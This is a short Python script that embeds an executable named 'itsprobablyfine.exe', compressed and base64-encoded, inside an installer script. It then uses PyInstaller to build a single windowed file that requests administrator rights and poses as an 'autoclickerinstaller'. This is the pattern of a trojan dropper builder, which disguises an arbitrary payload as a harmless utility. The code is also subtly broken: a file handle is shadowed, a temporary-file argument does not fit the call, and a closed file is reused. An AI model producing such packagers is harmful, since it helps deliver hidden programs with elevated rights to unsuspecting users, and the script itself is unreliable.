import PyInstaller.__main__
import tempfile, os, os.path
import base64
import gzip

with tempfile.TemporaryFile(dir=os.path.abspath("./tmp"), delete=True, delete_on_close = False) as f, open("./itsprobablyfine.exe", "rb") as src, open("./itsprobablyfine.exe", "rb") as exe, open("./installsomething.py", "rb") as src:
    print(f.name)
    f.write(src.read().replace(b'{{./itsprobablyfine.exe}}', base64.b64encode(gzip.compress(exe.read()))))
    f.close()

    PyInstaller.__main__.run([
        '--onefile',
        '--windowed',
        '--noconfirm',
        '--uac-admin',
        '--icon=susinstall.ico',
        '--name=autoclickerinstaller',
        f.name,
    ])